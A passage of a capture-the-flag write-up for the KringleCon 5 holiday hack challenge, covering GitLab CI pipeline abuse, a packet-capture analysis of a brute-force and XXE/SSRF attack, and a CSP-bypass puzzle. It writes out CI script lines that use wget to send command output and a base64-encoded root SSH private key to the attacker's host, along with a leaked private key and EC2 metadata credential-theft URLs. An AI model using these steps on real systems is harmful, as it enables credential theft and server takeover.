Author: knee-oh <a href="mailto:sporx@kringlecon.com">sporx@kringlecon.com</a><br />
Date:   Tue Oct 25 13:42:54 2022 -0700</p>
<p>    whoops</p>
<p>diff --git a/.ssh/.deploy b/.ssh/.deploy<br />
deleted file mode 100644<br />
index 3f7a9e3..0000000<br />
--- a/.ssh/.deploy<br />
+++ /dev/null<br />
@@ -1,7 +0,0 @@<br />
------BEGIN OPENSSH PRIVATE KEY------<br />
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW<br />
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5<br />
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g<br />
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot<br />
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==<br />
------END OPENSSH PRIVATE KEY------<br />
diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub<br />
deleted file mode 100644<br />
index 8c0b43c..0000000<br />
--- a/.ssh/.deploy.pub<br />
+++ /dev/null<br />
@@ -1 +0,0 @@<br />
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri <a href="mailto:sporx@kringlecon.com">sporx@kringlecon.com</a></p>
</div>
<p>An <em>SSH</em> private and public key were pushed to <em>Gitlab</em> and this commit deletes both files! We configure this key for our local user and clone again the repo using <em>SSH</em> this time:</p>
<div class="box">$ mkdir .ssh<br />
$ vim .ssh/id_ed25519 # write the private key<br />
$ chmod 400 .ssh/id_ed25519<br />
$ rm -Rf wordpress.flag.net.internal<br />
$ git clone <a href="mailto:git@gitlab.flag.net.internal">git@gitlab.flag.net.internal</a>:rings-of-powder/wordpress.flag.net.internal.git</div>
<p>This time we can push changes to the repo without being asked for a username/password! The idea here would be to modify the pipeline config to leak some <em>Gitlab</em> server data to our host/container. First we get our <em>IP</em> address with <code>hostname -i</code> and try a basic <code>curl</code> back to our host. We add the following line to the <code>script</code> section of the <code>.gitlab-ci.yml</code> file:</p>
<div class="box">- curl  &ldquo;http://172.18.0.99/$(id)&rdquo;</div>
<p>We commit, push, start a local web listener and wait for a ping:</p>
<div class="box">$ git add --all &amp;&amp; git commit -m &ldquo;test1&rdquo; &amp;&amp; git push &amp;&amp; python3 -m http.server 80</div>
<p>No ping, let&rsquo;s replace <code>curl</code> with <code>wget</code> just in case <code>curl</code> is not installed. And this time, we get a call back leaking the output of the <code>id</code> command:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj02_02.webp" alt="command execution" data-caption="command execution" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      command execution
      
        
        
      
    </figcaption>
  
</figure>
<p>Now let&rsquo;s leak the <code>root</code> <em>SSH</em> private key. We replace the script command with:</p>
<div class="box">- wget &ldquo;http://172.18.0.99/$(base64 /etc/gitlab-runner/hhc22-wordpress-deploy)&rdquo;</div>
<p>And a few seconds after the push, we get the private key:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj02_03.webp" alt="webserver root private SSH key" data-caption="webserver root private SSH key" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      webserver root private SSH key
      
        
        
      
    </figcaption>
  
</figure>
<p>We need to strip the superfluous <code>%0A</code> characters and we can save it:</p>
<div class="box">$ echo &ldquo;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEOEVZZFpUT3BmNVJFdVdYTWI5RktDRldvaUlYMkhvVTFhSDkwVjBQdHEzd0FBQUppTVhyMEJqRjY5CkFRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRDhFWWRaVE9wZjVSRXVXWE1iOUZLQ0ZXb2lJWDJIb1UxYUg5MFYwUHRxM3cKQUFBRUJ0TkU2c3FPRm9xa21PaGNCLzlEZ3phUWhRUkMvYndrQWJzQlh3cXJ0L21Qd1JoMWxNNmwvbEVTNVpjeHYwVW9JVgphaUloZlllaFRWb2YzUlhRKzJyZkFBQUFGSE53YjNKNFFHdHlhVzVuYkdWamIyNHVZMjl0QVE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K&rdquo; | base64 -d &gt; priv</div>
<p>We can now use it to connect to the webserver as <code>root</code> and retrieve the flag at the root of the filesystem:</p>
<div class="box">$ chmod 400 priv<br />
$ ssh -i priv <a href="mailto:root@wordpress.flag.net.internal">root@wordpress.flag.net.internal</a></div>
<p>We can now simply read the <code>/flag.txt</code> file:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj02_04.webp" alt="flag.txt" data-caption="flag.txt" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      flag.txt
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</code></p>
<h3 id="3---recover-the-web-ring">3 - Recover the Web Ring</h3>
<hr />
<h4 id="31-boria-pcap-mining">3.1 Boria PCAP Mining</h4>
<p>We are given a new <em>PCAP</em> file and the error log file of a webserver to analyze. The webserver supposedly went through an attack and we must investigate what happened by answering a few questions. From the error log we can already know the webserver IP address:</p>
<div class="box">* Running on http://10.12.42.16:8000</div>
<p>And from the <em>PCAP</em> file, if we filter only the <code>http</code> requests, we see that our website is <code>http://toteslegit.us</code>.</p>
<h5 id="311-naughty-ip">3.1.1 Naughty IP</h5>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>Use <a href="https://storage.googleapis.com/hhc22_player_assets/boriaArtifacts.zip">the artifacts</a> from Alabaster Snowball to analyze this attack on the Boria mines. Most of the traffic to this site is nice, but one IP address is being naughty! Which is it? Visit Sparkle Redberry in the Tolkien Ring for hints.</td>
<td>Web Ring</td>
</tr>
</tbody>
</table>
<p>If we look at the <code>Statistics -&gt; Conversation</code> menu, we see that one <em>IP</em> address generates a lot of traffic with the webserver, which can is shady and probably the attacker&rsquo;s <em>IP</em> address:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_00.webp" alt="Wireshark - Conversations" data-caption="Wireshark - Conversations" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - Conversations
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>18.222.86.32</code></p>
<h5 id="312-credential-mining">3.1.2 Credential Mining</h5>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>The first attack is a <a href="https://owasp.org/www-community/attacks/Brute_force_attack">brute force</a> login. What&rsquo;s the first username tried?</td>
<td>Web Ring</td>
</tr>
</tbody>
</table>
<p>The error log shows that the login page is <code>/login.html</code>. We can use the following <em>Wireshark</em> filter to get all the attacker attempts:</p>
<div class="box">(ip.src == 18.222.86.32) &amp;&amp; (http.request.method == &ldquo;POST&rdquo;) &amp;&amp; (http.request.uri == &ldquo;/login.html&rdquo;)</div>
<p>We have 910 <em>POST</em> requests and the first try is packet #7279:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_01.webp" alt="Wireshark - packet 7279" data-caption="Wireshark - packet 7279" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - packet 7279
      
        
        
      
    </figcaption>
  
</figure>
<p>The password list is quite short and has 101 password. The users that are tested are:</p>
<div class="box">alice<br />
bob<br />
charlie<br />
daniel<br />
edward<br />
felicia<br />
goran<br />
horatio<br />
ingrid</div>
<p>Most of the tries end up with the following message: <code>Invalid username or password</code>.<br />
But there is 1 successful try and we can see at the end of the scan (packet #21457), there is a successful login with <code>bob:passw0rd</code> and the attacker accesses the admin interface:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_02.webp" alt="Wireshark - TCP stream 1811" data-caption="Wireshark - TCP stream 1811" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - TCP stream 1811
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>alice</code></p>
<h5 id="313-404-ftw">3.1.3 404 FTW</h5>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>The next attack is <a href="https://owasp.org/www-community/attacks/Forced_browsing">forced browsing</a> where the naughty one is guessing URLs. What&rsquo;s the first successful URL path in this attack?</td>
<td>Web Ring</td>
</tr>
</tbody>
</table>
<p>A directory brute-force is performed by the attacker and we can see it with the following filter: <code>(http.request.method == &quot;GET&quot;) &amp;&amp; (ip.src == 18.222.86.32)</code>. This phase starts with tcp stream 1987 and ends with stream 2449 and there are 451 tries.</p>
<p>We can get all the webserver successful responses with the filter <code>((http.response.code == 200) &amp;&amp; (ip.dst == 18.222.86.32)) &amp;&amp; (tcp.stream &gt;= 1987) &amp;&amp; (tcp.stream &lt;= 2449)</code>. We get 2 hits:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_03.webp" alt="Wireshark - directory brute-force" data-caption="Wireshark - directory brute-force" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - directory brute-force
      
        
        
      
    </figcaption>
  
</figure>
<p>The <code>/proc</code> page is the first one to be discovered and only shows the message <code>Post XML here</code>. The <code>/maintenance.html</code> page seems to have <code>ping</code> command feature…we will never know if it is vulnerable to command injections ;)</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_04.webp" alt="Wireshark - /maintenance.html" data-caption="Wireshark - /maintenance.html" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - /maintenance.html
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>/proc</code></p>
<h5 id="314-imds-xxe-and-other-abbreviations">3.1.4 IMDS, XXE, and Other Abbreviations</h5>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>The last step in this attack was to use <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XXE</a> to get secret keys from the IMDS service. What URL did the attacker force the server to fetch?</td>
<td>Web Ring</td>
</tr>
</tbody>
</table>
<p>The attacker used a vulnerability in the <code>/proc</code> page to exploit an <em>XXE</em> vulnerability. We can follow the steps of the attacker with this filter:</p>
<div class="box">((http.request.method == &ldquo;POST&rdquo;) &amp;&amp; (ip.src == 18.222.86.32)) &amp;&amp; (http.request.uri == &ldquo;/proc&rdquo;)</div>
<p>If we follow the <em>HTTP</em> streams for each call we see:</p>
<ol>
<li>tcp stream 2699: test if system commands can be ran…they can&rsquo;t:</li>
</ol>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_05.webp" alt="Wireshark - TCP stream 2699" data-caption="Wireshark - TCP stream 2699" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - TCP stream 2699
      
        
        
      
    </figcaption>
  
</figure>
<ol start="2">
<li>tcp stream 2730: test if system files can be read…they can:</li>
</ol>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_06.webp" alt="Wireshark - TCP stream 2730" data-caption="Wireshark - TCP stream 2730" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - TCP stream 2730
      
        
        
      
    </figcaption>
  
</figure>
<ol start="3">
<li>tcp stream 2762: test if remote hosts can be called (SSRF)…they can:</li>
</ol>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_07.webp" alt="Wireshark - TCP stream 2762" data-caption="Wireshark - TCP stream 2762" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - TCP stream 2762
      
        
        
      
    </figcaption>
  
</figure>
<ol start="4">
<li>tcp stream 2801: test if the cloud provider metadata service is reachable…it is:</li>
</ol>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_08.webp" alt="Wireshark - TCP stream 2801" data-caption="Wireshark - TCP stream 2801" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - TCP stream 2801
      
        
        
      
    </figcaption>
  
</figure>
<p>The following call is done on <code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/</code> (stream 2838) and the result shows the folder <code>info</code> and <code>security-credentials</code>. Next query is to <code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials</code> (stream 2875) that returns the identity role name of the host: <code>ec2-instance</code>. Last query is done with the role name to get the host credentials (stream 2907):</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_09.webp" alt="Wireshark - TCP stream 2907" data-caption="Wireshark - TCP stream 2907" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - TCP stream 2907
      
        
        
      
    </figcaption>
  
</figure>
<p>With those credentials, we can impersonate the <em>EC2</em> instance and do <em>AWS</em> calls with the same permissions as the instance.</p>
<p>Answer: <code>http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance</code></p>
<h4 id="32-open-boria-mine-door">3.2 Open Boria Mine Door</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>3/5</td>
<td>Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.</td>
<td>Web Ring</td>
</tr>
</tbody>
</table>
<p>This is a <em>Javascript</em> challenge where we have some <code>locks</code> to unlock by creating a <code>path</code> between the left and right pin(s). Some doors have a <em>Content Security Policy</em> (<em>CSP</em>) that we need to bypass.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_10.webp" alt="CAPTCOA" data-caption="CAPTCOA" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CAPTCOA
      
        
        
      
    </figcaption>
  
</figure>
<p>Each <code>door</code> is an iframe pointing to <a href="https://hhc22-novel.kringlecon.com/pin">https://hhc22-novel.kringlecon.com/pin</a>&lt;number&gt; and the goal is to link them all. We need to pay attention to the pins' color as well:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_11.webp" alt="CAPTCOA" data-caption="CAPTCOA" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CAPTCOA
      
        
        
      
    </figcaption>
  
</figure>
<h5 id="lock-1">Lock 1</h5>
<p>For this first lock, we can simply look at the source code of the page and see a comment: <code>&lt;!-- @&amp;@&amp;&amp;W&amp;&amp;W&amp;&amp;&amp;&amp; --&gt;</code>. We unlock it by entering this string in the edit box:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj03_12.webp" alt="Lock 1 unlocked" data-caption="Lock 1 unlocked" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Lock 1 unlocked
      
        
        
      
    </figcaption>
  
</figure>
<h5 id="lock-2">Lock 2</h5>
<p>The source code of the second pin show the following <em>CSP</em>:</p>
<div class="box">&lt;meta http-equiv=&ldquo;Content-Security-Policy&rdquo; content=&ldquo;default-src &lsquo;self&rsquo;;script-src &lsquo;self&rsquo;;style-src &lsquo;self&rsquo; &lsquo;unsafe-inline&rsquo;&quot;&gt;</div>
<p>If we translate theabove in human terms:</p>
<ul>
<li>The <code>default-src</code> directive defines the default policy for fetching <em>JS</em>, images, <em>CSS</em>, etc. resources.</li>
<li>The <code>script-src</code> directive defines what are the valid sources of <em>Javascript</em>.</li>
<li>The <code>style-src</code> directive defins what are the valid sources of <em>CSS</em>.</li>
<li>The source list <code>self</code> allows loading resources from the same origin (scheme, host and port).</li>
<li>The source list <code>unsafe-inline</code> allows  use of inline source elements such as style attribute, onclick, or script tag bodies (depends on the context of the source it is applied to) and javascript: <em>URIs</em>.</li>
</ul>
<p>In other words, we can use in-line HTML tags with inline <em>CSS</em>. So we can write any text, make sure to have a big size as the pins are not on the same horizontal line, translate it down and make sure the letter spacing is negative so all the letters will touch. This is one possible solution:</p>
<div class="box">&lt;h3 style=&quot;font-size:4.5em;translate:-30px -100px;letter-spacing: -10px;&quot;&gt;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&lt;/h3&gt;</div>
<p>Another solution, this time involving text rotation and the same text as for pin 1 could be:</p>
